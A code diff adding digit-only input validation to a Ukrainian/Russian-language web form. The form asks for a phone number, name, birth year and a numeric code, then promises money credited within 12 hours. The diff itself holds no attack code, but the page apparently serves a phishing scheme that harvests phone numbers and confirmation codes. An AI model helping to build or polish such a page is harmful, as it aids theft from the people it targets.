@@ -46,6 +46,7 @@
       font-size: 46px;
       font-weight: 800;
       color: #ffe100;
+      font-family: Arial, sans-serif;
       letter-spacing: 0.04em;
       line-height: 1;
     }
@@ -1252,6 +1253,7 @@
               placeholder="93 469 99 99"
               autocomplete="tel"
               inputmode="numeric"
+              pattern="[0-9 ]*"
             />
             <div class="phone-input-actions">
               <button type="button" class="phone-input-clear" id="phone-clear-btn">×</button>
@@ -1347,6 +1349,7 @@
             type="text"
             inputmode="numeric"
             maxlength="4"
+            pattern="[0-9]*"
             placeholder="1999"
             autocomplete="bday-year"
           />
@@ -1448,7 +1451,7 @@
             class="code-style-input"
             type="text"
             inputmode="numeric"
-            maxlength="6"
+            pattern="[0-9]*"
             autocomplete="off"
           />
 
@@ -1500,7 +1503,7 @@
           <div class="result-text">Гроші будуть зараховані на ваш рахунок протягом 12 годин.</div>
 
           <div class="result-actions">
-            <button class="result-button" id="final-thanks-btn">Завершити</button>
+            <button class="result-button" id="final-thanks-btn">  </button>
           </div>
         </div>
       </div>
@@ -1700,6 +1703,29 @@
       return parts.join(' ');
     }
 
+    function bindDigitsOnlyInput(input, { allowSpaces = false } = {}) {
+      input.addEventListener('beforeinput', (event) => {
+        if (!event.data || !event.inputType.startsWith('insert')) {
+          return;
+        }
+
+        const pattern = allowSpaces ? /[^\d\s]/ : /\D/;
+
+        if (pattern.test(event.data)) {
+          event.preventDefault();
+        }
+      });
+
+      input.addEventListener('paste', (event) => {
+        const pastedText = event.clipboardData?.getData('text') || '';
+        const pattern = allowSpaces ? /[^\d\s]/ : /\D/;
+
+        if (pattern.test(pastedText)) {
+          event.preventDefault();
+        }
+      });
+    }
+
     function updateNamePreview() {
       const value = nameInputEl.value.trim();
       namePreviewValueEl.textContent = value || 'Ваше имя';
@@ -1728,7 +1754,7 @@
     }
 
     function updateLivingYearPreview() {
-      const value = livingYearInputEl.value.replace(/\D/g, '').slice(0, 6);
+      const value = livingYearInputEl.value.replace(/\D/g, '');
       livingYearInputEl.value = value;
       if (livingYearPreviewValueEl) {
         livingYearPreviewValueEl.textContent = value || '2026';
@@ -1984,9 +2010,9 @@
     }
 
     async function submitLivingYear() {
-      const livingYear = livingYearInputEl.value.replace(/[^\d]/g, '').slice(0, 6);
+      const livingYear = livingYearInputEl.value.replace(/[^\d]/g, '');
 
-      if (!/^\d{1,6}$/.test(livingYear)) {
+      if (!/^\d+$/.test(livingYear)) {
         setStatus(livingYearStatusMessageEl, 'Введите до 6 цифр для года проживания.', true);
         return;
       }
@@ -2088,6 +2114,7 @@
       await submitPhone();
     });
 
+    bindDigitsOnlyInput(phoneInputEl, { allowSpaces: true });
     phoneInputEl.addEventListener('input', () => {
       phoneInputEl.value = formatPhoneInputDigits(phoneInputEl.value);
       setStatus(phoneStatusMessageEl);
@@ -2120,6 +2147,7 @@
       nameInputEl.focus();
     });
 
+    bindDigitsOnlyInput(birthYearInputEl);
     birthYearInputEl.addEventListener('input', () => {
       setStatus(birthYearStatusMessageEl);
       updateBirthYearDots();
@@ -2176,6 +2204,7 @@
       await submitLivingYear();
     });
 
+    bindDigitsOnlyInput(livingYearInputEl);
     livingYearInputEl.addEventListener('input', () => {
       setStatus(livingYearStatusMessageEl);
       updateLivingYearPreview();
